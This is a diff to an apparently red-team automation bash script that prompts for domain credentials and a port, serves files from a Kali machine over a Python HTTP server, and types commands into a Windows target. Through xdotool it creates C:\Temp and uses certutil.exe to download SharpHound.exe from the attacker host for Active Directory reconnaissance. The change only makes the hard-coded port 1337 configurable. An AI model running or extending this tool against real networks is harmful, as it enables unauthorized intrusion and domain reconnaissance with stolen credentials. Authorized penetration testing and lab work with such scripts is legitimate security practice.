@@ -9,16 +9,17 @@ source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh
 source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh
 
 # Generate gui form
-generate_form "Username" "Password" "Domain" "DC" "NsIP"
+generate_form "http Port" "Username" "Password" "Domain" "DC" "NsIP"
 
 USERNAME=${form_data["Username"]}
 PASSWORD=${form_data["Password"]}
 DOMAIN=${form_data["Domain"]}
 DC=${form_data["DC"]}
 NSIP=${form_data["NsIP"]}
+PORT=${form_data["http Port"]}
 
 cd ~/Desktop/base/code/xdotool/scripts/windows/bloodhound/.files
-python3 -m http.server 1337 &
+python3 -m http.server ${PORT} &
 HTTP_PID=$!
 
 TMP_FOLDER="C:\Temp"
@@ -27,7 +28,7 @@ paste_command "if not exist ${TMP_FOLDER} mkdir ${TMP_FOLDER}"
 xdotool key Return
 sleep 0.8
 
-paste_command "certutil.exe -urlcache -split -f 'http://${KALI_IP}:1337/SharpHound.exe' '${TMP_FOLDER}\SharpHound.exe'"
+paste_command "certutil.exe -urlcache -split -f 'http://${KALI_IP}:${PORT}/SharpHound.exe' '${TMP_FOLDER}\SharpHound.exe'"
 xdotool key Return
 sleep 2
 
